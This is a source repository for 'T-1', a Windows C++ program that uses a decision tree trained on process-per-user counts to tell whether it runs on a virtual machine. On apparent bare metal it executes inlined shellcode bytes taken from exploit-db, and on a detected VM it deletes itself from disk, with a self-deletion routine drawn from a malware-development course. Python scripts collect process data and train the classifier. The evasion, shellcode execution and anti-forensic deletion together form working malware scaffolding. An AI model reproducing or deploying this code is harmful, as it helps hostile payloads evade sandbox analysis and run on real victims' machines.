Project Path: arc_gmh5225_T-1_sc2mwtvz

Source Tree:

```txt
arc_gmh5225_T-1_sc2mwtvz
├── LICENSE
├── Makefile
├── README.md
├── build
├── inc
│   ├── AbsoluteValue.h
│   ├── DeleteSelfFromDisk.h
│   ├── GetProcessCountViaSnapShot.h
│   ├── GetUniqueUserCountViaSnapshot.h
│   ├── InlinedShellcodeExecution.h
│   ├── VmDetection.h
│   ├── debug.h
│   └── intelligence.h
├── python
│   ├── DecisionTree
│   │   ├── badtree.png
│   │   ├── dataset
│   │   │   └── process_data.csv
│   │   └── decision_tree.py
│   └── Utilities
│       └── machine_data.py
└── src
    ├── AbsoluteValue.cxx
    ├── DeleteSelfFromDisk.cxx
    ├── GetProcessCountViaSnapShot.cxx
    ├── GetUniqueUserCountViaSnapshot.cxx
    ├── InlinedShellcodeExecution.cxx
    ├── VmDetection.cxx
    └── main.cxx

```

`LICENSE`:

```
MIT License

Copyright (c) 2024 Steve S.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Makefile`:

```

# Set defaults
EXEEXT := .exe

# Windows-specific settings
ifeq ($(OS), Windows_NT)
	# Directories
	SRCDIR := .\src
	BUILDDIR := .\build
	INCDIR := .\inc
	WILD_OBJ := \*.o
	WILD_EXE := \*.exe

	CXX := x86_64-w64-mingw32-g++
	CXXFLAGS := -I$(INCDIR) -Wall -Wextra -std=c++23 -O1 -static -Wno-missing-field-initializers -Wno-ignored-qualifiers -s -DDEBUG
	LDFLAGS := -L$(INCDIR) -luser32 -lkernel32 -loleaut32 -lwbemuuid -lole32 -s
	MKDIR := if not exist "$(BUILDDIR)" mkdir "$(BUILDDIR)"
	RM := del
else
# Cross-compiling from Linux to Windows

	# Directories
	SRCDIR := ./src
	BUILDDIR := ./build
	INCDIR := ./inc
	WILD_OBJ := /*.o
	WILD_EXE := \*.exe

	CXX := x86_64-w64-mingw32-g++
	CXXFLAGS := -I$(INCDIR) -Wall -Wextra -std=c++23 -O1 -static -Wno-missing-field-initializers -Wno-ignored-qualifiers -s -DDEBUG
	LDFLAGS := -L$(INCDIR) -lntdll -luser32 -lkernel32 -loleaut32 -lwbemuuid -lole32 -s
	MKDIR := mkdir -p $(BUILDDIR)
	RM := rm -f
endif

# Target executable
TARGET := $(BUILDDIR)/T-1$(EXEEXT)

# Source files
SRCS := $(wildcard $(SRCDIR)/*.cxx)

# Object files
OBJS := $(SRCS:$(SRCDIR)/%.cxx=$(BUILDDIR)/%.o)

# Rules
all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) $(OBJS) $(LDFLAGS) -o $@
	$(RM) $(BUILDDIR)$(WILD_OBJ)

$(BUILDDIR)/%.o: $(SRCDIR)/%.cxx
	$(MKDIR)
	$(CXX) $(CXXFLAGS) -c -o $@ $<

clean:
	$(RM) $(BUILDDIR)$(WILD_OBJ)
	$(RM) $(BUILDDIR)$(WILD_EXE)

.PHONY: all clean

```

`README.md`:

```md
# T-1: Intelligent VM Detection with DTC

## Project Overview

**T-1** is a C++ project inspired by the **T-1 Battlefield Robot**, also known as the **T-1 Ground Assault Vehicle**, which is a fully autonomous ground offensive system developed by Cyber Research Systems. This project simulates part of the logic behind the T-1 by leveraging a **Decision Tree Classifier (DTC)** trained using Python's **scikit-learn** library to implement VM detection in a C++ environment.

The model is trained to predict whether the system is running on a virtual machine based on the number of processes per user. The trained model is then used to implement VM detection in the C++ file `VmDetection.cxx`. The decision tree logic is extracted and converted into conditional statements that can be applied in any language, allowing the developer to integrate machine learning predictions into a C++ application.

### Key Features:
- **Decision Tree Classifier (DTC) Training**: A Python script uses `scikit-learn` to train a decision tree model based on system data, which can be visualized and implemented in C++.
- **VM Detection**: Implements the decision tree logic in the function `VmDetection` to determine whether the system is running on bare metal or inside a virtual machine.
- **Self-Deletion and Shellcode Execution**: Based on the VM detection result, the system can either execute shellcode or self-delete when running in a virtualized environment.

## Project Structure

- **`main.cxx`**: The main entry point of the project, which handles process and user counting, executes VM detection, and takes appropriate action based on the result.
- **`intelligence.h`**: Contains declarations for system functions such as `GetProcessCountViaSnapShot`, `GetUniqueUserCountViaSnapshot`, and `VmDetection`.
- **`VmDetection.cxx`**: Implements the `VmDetection` logic based on the decision tree classifier's learnings.

- **Python Scripts**:
    - The `python` directory contains scripts for training the decision tree classifier on system data, visualizing the model, and exporting the learned logic for use in C++.

## Decision Tree Classifier Logic

The `VmDetection` function in C++ is based on the decision tree classifier model, which uses the `process_count_per_user` as the main feature to detect whether the system is virtualized or not:

```c++
BOOL VmDetection(float process_count_per_user){
	
	// Conditional extracted from DecisionTreeClassifier learnings
	if ((process_count_per_user > 75.3) || (process_count_per_user > 61.45 && process_count_per_user <= 69.3)){
		
		PRINT("[i] Running on bare metal machine!\n");
		return TRUE;
		
	}

	return FALSE;
}
```

This logic is derived from the decision tree model's learnings and applied to the `VmDetection` function in C++.

## Dependencies

- **C++**: The project is written in C++ and utilizes standard C++ libraries for system interaction.
- **scikit-learn (Python)**: Used for training the decision tree model. The `python` directory contains all scripts and data needed to train and visualize the model.

## Setup Instructions

### Step 1: Train the Decision Tree Classifier
The first step is to train the decision tree classifier using the provided Python scripts. These scripts are located in the `python` directory:

```bash
cd .\python\DecisionTree
python decision_tree.py
```

This script will train the model based on the collected system data and output a visualization of the decision tree, which you can use to understand the model's decision-making process.

### Step 2: Build the C++ Project
Once the decision tree logic has been extracted and implemented in `VmDetection.cxx`, you can build the C++ project using a standard C++ compiler.

```bash
mingw32-make.exe
```

### Step 3: Run the Executable
After building the project, you can run the executable to perform VM detection and trigger appropriate actions:

```bash
./build/T-1.exe
```

## Special Thanks

Special thanks to all the researchers who voluntarily ran the Python script to collect the necessary data for training the Decision Tree Classifier. Your contributions made this project possible!

## License

T-1 is licensed under the MIT License.

---

*Inspired by the T-1 Ground Assault Vehicle, the first Terminator-class robot.*  
More information: [T-1 Terminator](https://terminator.fandom.com/wiki/T-1)


```

`inc/AbsoluteValue.h`:

```h
INT AbsoluteValue(INT x);

```

`inc/DeleteSelfFromDisk.h`:

```h
BOOL DeleteSelfFromDisk();
```

`inc/GetProcessCountViaSnapShot.h`:

```h
BOOL GetProcessCountViaSnapShot(OUT DWORD* dwProcessCount);

```

`inc/GetUniqueUserCountViaSnapshot.h`:

```h
BOOL GetUniqueUserCountViaSnapshot(OUT DWORD* dwUserCount);

```

`inc/InlinedShellcodeExecution.h`:

```h
VOID InlinedShellcodeExecution();
```

`inc/VmDetection.h`:

```h
BOOL VmDetection(float process_count_per_user);
```

`inc/debug.h`:

```h
#ifdef DEBUG
#define PRINT(...) printf(__VA_ARGS__)
#else
#define PRINT(...)
#endif

```

`inc/intelligence.h`:

```h
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <comdef.h>
#include <comutil.h>
#include <wbemidl.h>
#include <string.h>

#define MemCopy         __builtin_memcpy
#define MemSet          __stosb
#define MemZero( p, l ) __stosb( p, 0, l )

#include "debug.h"

#include "GetProcessCountViaSnapShot.h"
#include "GetUniqueUserCountViaSnapshot.h"
#include "AbsoluteValue.h"
#include "VmDetection.h"
#include "InlinedShellcodeExecution.h"
#include "DeleteSelfFromDisk.h"
```

`python/DecisionTree/dataset/process_data.csv`:

```csv
CSV Schema (1 sample row):
Headers: Process Count, Process Count/User, User Count, Sandbox Score
Sample: "33", "8", "4", "1"
... [21 more rows omitted]

```

`python/DecisionTree/decision_tree.py`:

```py
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

from sklearn.model_selection import RandomizedSearchCV
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score
from sklearn.tree import plot_tree

# Define the file path
CSV_FILE = './dataset/process_data.csv'

MIN_DATASET_SIZE = 100
R_STATE = 42

class BadDecisionTree:
    def __init__(self, df: pd.DataFrame):
        self.best_model = None
        self.model: DecisionTreeClassifier = DecisionTreeClassifier(random_state=R_STATE)
        self.hyperparams: dict = {
            'max_depth': np.arange(1, 10, dtype=int),
            'min_samples_leaf': np.arange(1, 50, dtype=int),
            'min_samples_split': np.arange(2, 10, dtype=int),
            'criterion': ["gini", "entropy", "log_loss"],
            'splitter': ["best", "random"],
            'class_weight': ["balanced", None],
            'ccp_alpha': np.linspace(0, 0.1, 50)   # 100 values between 0 and 1
        }


        self.init_data: pd.DataFrame = df
        
        self.data: pd.DataFrame = self.init_data.sample(frac=0.75, random_state=R_STATE)
        self.test_data: pd.DataFrame = self.init_data.drop(self.data.index)

        self.best_score: float = 0.0
        
        if self.data.shape[0] < MIN_DATASET_SIZE:
            self._data_augment()

        self.X_train = self.data.drop('Sandbox Score', axis=1)
        self.y_train = self.data['Sandbox Score']        
        
        self.X_test = self.test_data.drop('Sandbox Score', axis=1)
        self.y_test = self.test_data['Sandbox Score']

    def _data_augment(self) -> None:
        self.data = self.data.sample(n=MIN_DATASET_SIZE, replace=True)

    def tune_hyperparameters(self) -> None:
        # Number of iteration for RandomizedSearchCV
        n_iter_search = 5000
        
        # Setting up the Randomized Search with cross validation
        self.best_model = RandomizedSearchCV(self.model, param_distributions=self.hyperparams,
                                             n_iter=n_iter_search, cv=5, scoring='accuracy', random_state=R_STATE)

        self.best_model.fit(self.X_train, self.y_train)
        self.best_score = self.best_model.best_score_
        return self.best_model.best_params_

    def visualize_tree(self, filename: str):
        # Check if best_model is not None and if it's been fit
        if self.best_model and hasattr(self.best_model, 'best_estimator_'):
            plt.figure(figsize=(10, 6), dpi=100)  # increase figure size and dpi

            # Use plot_tree from sklearn.tree to visualize the tree
            plot_tree(self.best_model.best_estimator_,
                      feature_names=self.X_train.columns,
                      class_names=True,
                      rounded=True,
                      fontsize=8,
                      filled=True)

            # Save the tree
            plt.savefig(filename)
        else:
            print("The model has not been created or fitted yet")


if __name__ == "__main__":

    # Read the CSV into a DataFrame
    data = pd.read_csv(CSV_FILE)

    BadTree = BadDecisionTree(data)

    # Print hyperparameters
    print("\n\nTraining BadTree:")
    print(BadTree.tune_hyperparameters())

    # Define the data and the column names
    data = [[140, 70, 2]]  # The data inside two brackets makes it a 2D list which represents one row and three columns
    columns = ['Process Count', 'Process Count/User', 'User Count']
    test_frame = pd.DataFrame(data, columns=columns)

    badtrer_predict_test = BadTree.best_model.predict(BadTree.X_test)
    badtree_acc = accuracy_score(badtrer_predict_test, BadTree.y_test) 

    # Make a prediction on our novel test frame
    print(f'BadTree accuracy       : {badtree_acc * 100:.2f}%\n')


    # Visualize and save the decision tree
    BadTree.visualize_tree("badtree.png")

```

`python/Utilities/machine_data.py`:

```py
import psutil
from collections import Counter
import csv

def get_running_process_info():
    # List to hold the names and users of all running processes
    process_info = []
    
    # Iterate over all running processes
    for process in psutil.process_iter(['name', 'username']):
        try:
            # Get the name and username of the process
            name = process.info['name']
            username = process.info['username']
            # Append the name and username as a tuple to the list
            process_info.append((name, username))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            # If the process has been terminated or access is denied, skip it
            continue

    return process_info

def analyze_processes(process_info):
    # Calculate the total number of processes
    total_processes = len(process_info)
    
    # Calculate the number of processes per user
    user_process_counts = Counter(user for _, user in process_info)
    
    # Calculate the total number of unique users
    total_users = len(user_process_counts)
    
    # Prepare data for CSV output
    data = [
        ["Process Count", total_processes],
        ["Process Count/Users", total_processes/total_users],
        ["User Count", total_users],
        ["Sandbox Score", 0]
    ]
    
    
    # Append user process counts to data
    # data.extend([["None" if not user else "SYSTEM" if "SYSTEM" in user else "User", count] for user, count in user_process_counts.items()])

    headers = []
    row = []
    
    # Print formatted results
    for item in data:
        headers.append(item[0])
        row.append(item[1])
        print(f"{item[0]}: {item[1]}")
    
    print(headers)
    print(row)
    
    # Write results to CSV
    with open('process_info.csv', 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(headers)
        writer.writerow(row)

if __name__ == "__main__":
    running_processes = get_running_process_info()
    analyze_processes(running_processes)

#run me pls

```

`src/AbsoluteValue.cxx`:

```cxx
#include "intelligence.h"

INT AbsoluteValue(INT x){
    return x < 0 ? -x : x;
}

```

`src/DeleteSelfFromDisk.cxx`:

```cxx
/*
* Strongly based on the implementation available on maldevacademy.com
*/

#include "intelligence.h"

// Custom FILE_RENAME_INFO structure definition
typedef struct _FILE_RENAME_INFO_EX {
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN10_RS1)
    union {
        BOOLEAN ReplaceIfExists;
        DWORD Flags;
    } DUMMYUNIONNAME;
#else
    BOOLEAN ReplaceIfExists;
#endif
    HANDLE RootDirectory;
    DWORD FileNameLength;
    WCHAR FileName[MAX_PATH];     // Instead of FileName[1]
} FILE_RENAME_INFO_EX, * PFILE_RENAME_INFO_EX;


BOOL DeleteSelfFromDisk() {

    CONST WCHAR                 NEW_STREAM[7]               = L":%x%x\x00";
    BOOL                        bSTATE                      = FALSE;
    WCHAR					    szFileName[MAX_PATH * 2]    = { 0x00 };
    FILE_RENAME_INFO_EX         FileRenameInfo_Ex            = { .ReplaceIfExists = FALSE, .RootDirectory = 0x00 , .FileNameLength = sizeof(NEW_STREAM)};
    FILE_DISPOSITION_INFO       FileDisposalInfo            = { .DeleteFile = TRUE };
    HANDLE                      hLocalImgFileHandle         = INVALID_HANDLE_VALUE;

    if (GetModuleFileNameW(NULL, szFileName, (MAX_PATH * 2)) == 0x00) {
        PRINT("[!] GetModuleFileNameW Failed With Error: %ld \n", GetLastError());
        goto _END_OF_FUNC;
    }

    swprintf(FileRenameInfo_Ex.FileName, MAX_PATH, NEW_STREAM, rand(), rand() * rand());

    if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x0, NULL)) == INVALID_HANDLE_VALUE) {
        PRINT("[!] CreateFileW [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!SetFileInformationByHandle(hLocalImgFileHandle, FileRenameInfo, &FileRenameInfo_Ex, sizeof(FILE_RENAME_INFO_EX))) {
        PRINT("[!] SetFileInformationByHandle [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    CloseHandle(hLocalImgFileHandle);

    if ((hLocalImgFileHandle = CreateFileW(szFileName, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0x0, NULL)) == INVALID_HANDLE_VALUE) {
        PRINT("[!] CreateFileW [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!SetFileInformationByHandle(hLocalImgFileHandle, FileDispositionInfo, &FileDisposalInfo, sizeof(FileDisposalInfo))) {
        PRINT("[!] SetFileInformationByHandle [%d] Failed With Error: %ld \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bSTATE = TRUE;

_END_OF_FUNC:
    if (hLocalImgFileHandle != INVALID_HANDLE_VALUE)
        CloseHandle(hLocalImgFileHandle);
    return bSTATE;
}
```

`src/GetProcessCountViaSnapShot.cxx`:

```cxx
#include "intelligence.h"

BOOL GetProcessCountViaSnapShot(OUT DWORD* dwProcessCount) {

	PROCESSENTRY32  ProcEntry						= { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE			hSnapShot						= INVALID_HANDLE_VALUE;
    DWORD           dwProcCount                     = 0x0;

	if (!dwProcessCount){
		return FALSE;
    }

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x0)) == INVALID_HANDLE_VALUE) {
		PRINT("[!] CreateToolhelp32Snapshot Failed With Error: %ld \n", GetLastError());
		return FALSE;
	}

	if (!Process32First(hSnapShot, &ProcEntry)) {
		PRINT("[!] Process32First Failed With Error: %ld \n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		dwProcCount++;

	} while (Process32Next(hSnapShot, &ProcEntry));

    *dwProcessCount = dwProcCount;

_END_OF_FUNC:
	if (hSnapShot != INVALID_HANDLE_VALUE){
		CloseHandle(hSnapShot);
    }
    
	return (*dwProcessCount) ? TRUE : FALSE;
}

```

`src/GetUniqueUserCountViaSnapshot.cxx`:

```cxx
#include "intelligence.h"

#define MAX_NAME 256
#define HASH_TABLE_SIZE 1024

// based on: https://stackoverflow.com/questions/2686096/c-get-username-from-process

// Simple hash table implementation to track unique user names
typedef struct HashEntry {
    char user[MAX_NAME * 2];
    struct HashEntry* next;
} HashEntry;

typedef struct HashTable {
    HashEntry* entries[HASH_TABLE_SIZE];
} HashTable;

unsigned int hash(const char* str) {
    unsigned int hash = 0;
    while (*str) {
        hash = (hash << 5) + hash + *str++;
    }
    return hash % HASH_TABLE_SIZE;
}

void insert(HashTable* table, const char* user) {
    unsigned int index = hash(user);
    HashEntry* entry   = table->entries[index];
    
    while (entry != NULL) {
        
        if (strcmp(entry->user, user) == 0) {
            return; // User already in table
        }
        entry = entry->next;
    }

    entry = (HashEntry*)malloc(sizeof(HashEntry));
    strcpy(entry->user, user);
    entry->next = table->entries[index];
    table->entries[index] = entry;
}

void clearTable(HashTable* table) {
    for (int i = 0; i < HASH_TABLE_SIZE; i++) {
        
        HashEntry* entry = table->entries[i];
        
        while (entry != NULL) {
            HashEntry* prev = entry;
            entry = entry->next;
            free(prev);
        }
        table->entries[i] = NULL;
    }
}

BOOL GetLogonFromToken(HANDLE hToken, char* strUser, char* strDomain) {
    DWORD dwSize     =  MAX_NAME;
    BOOL bSuccess    =  FALSE;
    DWORD dwLength   =  0;
    PTOKEN_USER ptu  =  NULL;

    // Verify the parameter passed in is not NULL.
    if (NULL == hToken) {
        goto _END_OF_FUNC;
    }

    if (!GetTokenInformation(
            hToken,      // handle to the access token
            TokenUser,   // get information about the token's groups
            (LPVOID)ptu, // pointer to PTOKEN_USER buffer
            0,           // size of buffer
            &dwLength    // receives required buffer size
        )) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            PRINT("GetTokenInformation Error %ld\n", GetLastError());
            goto _END_OF_FUNC;
        }

        ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY, dwLength);

        if (ptu == NULL) {
            goto _END_OF_FUNC;
        }
    }

    if (!GetTokenInformation(
            hToken,      // handle to the access token
            TokenUser,   // get information about the token's groups
            (LPVOID)ptu, // pointer to PTOKEN_USER buffer
            dwLength,    // size of buffer
            &dwLength    // receives required buffer size
        )) {
        goto _END_OF_FUNC;
    }

    SID_NAME_USE SidType;
    char lpName[MAX_NAME];
    char lpDomain[MAX_NAME];

    if (!LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
        DWORD dwResult = GetLastError();
        if (dwResult == ERROR_NONE_MAPPED) {
            strcpy(lpName, "NONE_MAPPED");
        } else {
            PRINT("LookupAccountSid Error %ld\n", GetLastError());
        }
    } else {
        strcpy(strUser, lpName);
        strcpy(strDomain, lpDomain);
        bSuccess = TRUE;
    }

_END_OF_FUNC:

    if (ptu != NULL) {
        HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
    }
    return bSuccess;
}

BOOL GetUserFromProcess(const DWORD procId, char* strUser, char* strDomain, char* placeHolder, DWORD* last_error) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, procId);
    HANDLE hToken   = NULL;
	DWORD  error    = GetLastError();

    if (hProcess == NULL) {
	
		if(error != *last_error){
			placeHolder[0] += 1;
			*last_error = error;
		}
		
        return FALSE;
    }
    
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		error    = GetLastError();
		
		if(error != *last_error){
			placeHolder[0] += 1;
			*last_error = error;
		}
		
        CloseHandle(hProcess);
        return FALSE;
    }
    
    BOOL bres = GetLogonFromToken(hToken, strUser, strDomain);

    CloseHandle(hToken);
    CloseHandle(hProcess);
    return bres ? TRUE : FALSE;
}

BOOL GetUniqueUserCountViaSnapshot(DWORD* dwUserCount) {
    PROCESSENTRY32 ProcEntry  =  { .dwSize = sizeof(PROCESSENTRY32) };
    HANDLE hSnapShot          =  INVALID_HANDLE_VALUE;
    char PlaceHolder[]        =  "0_PlaceHolder";
    HashTable uniqueUsers     =  { 0 }; // Initialize hash table
	DWORD lastErrorCode       =  0x0;   // Lazy unique error code check
	
    if (!dwUserCount) {
        return FALSE;
    }

    if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x0)) == INVALID_HANDLE_VALUE) {
        PRINT("[!] CreateToolhelp32Snapshot Failed With Error: %ld \n", GetLastError());
        return FALSE;
    }

    if (!Process32First(hSnapShot, &ProcEntry)) {
        PRINT("[!] Process32First Failed With Error: %ld \n", GetLastError());
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
        char strUser[MAX_NAME], strDomain[MAX_NAME];
        if (GetUserFromProcess(ProcEntry.th32ProcessID, strUser, strDomain, PlaceHolder, &lastErrorCode)) {
            insert(&uniqueUsers, strUser);
        }else{
            insert(&uniqueUsers, PlaceHolder);
        }

    } while (Process32Next(hSnapShot, &ProcEntry));

    *dwUserCount = 0;
    
    for (int i = 0; i < HASH_TABLE_SIZE; i++) {
        HashEntry* entry = uniqueUsers.entries[i];
        while (entry != NULL) {
            (*dwUserCount)++;
            entry = entry->next;
        }
    }

    if (hSnapShot != INVALID_HANDLE_VALUE) {
        CloseHandle(hSnapShot);
    }

    clearTable(&uniqueUsers);

    return (*dwUserCount) ? TRUE : FALSE;
}


```

`src/InlinedShellcodeExecution.cxx`:

```cxx
void InlinedShellcodeExecution(){
	
	
	// Inlined shellcode. IRL this should be injected somewhere, somehow: https://www.exploit-db.com/shellcodes/49819
	asm(".byte 0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,0x48,0x83,0xec,0x20,0x41,0xff,0xd6;");

}	
	
```

`src/VmDetection.cxx`:

```cxx
#include "intelligence.h"

BOOL VmDetection(float process_count_per_user){
	
	// Conditional extracted from DecisionTreeClassifier learnings
	if ((process_count_per_user > 75.3) || (process_count_per_user > 61.45 && process_count_per_user <= 69.3)){
		
		PRINT("[i] Running on bare metal machine!\n");
		return TRUE;
		
	}

	return FALSE;
	
}
```

`src/main.cxx`:

```cxx
#include "intelligence.h"

int main(){
    
    DWORD process_count    = 0x0;
    DWORD user_count       = 0x0;
	float process_per_user = 0.0f;
    
    GetProcessCountViaSnapShot(&process_count);
    GetUniqueUserCountViaSnapshot(&user_count);
	
	process_per_user = process_count / user_count;
    
    PRINT("[i] Process Count        : %ld\n", process_count   );
    PRINT("[i] Process Count / User : %.2f\n" , process_per_user);
    PRINT("[i] Users Count          : %ld\n", user_count      );
	
	if(VmDetection(process_per_user)){
		
		// ShellcodeDetonation
		PRINT("[i] Executing shellcode!\n");
		InlinedShellcodeExecution();
		
	}else{
		
		// SelfDelete
		PRINT("[i] VM Detected. Self-deleting!\n");
		DeleteSelfFromDisk();
		
	}
	
    return 0;
}

```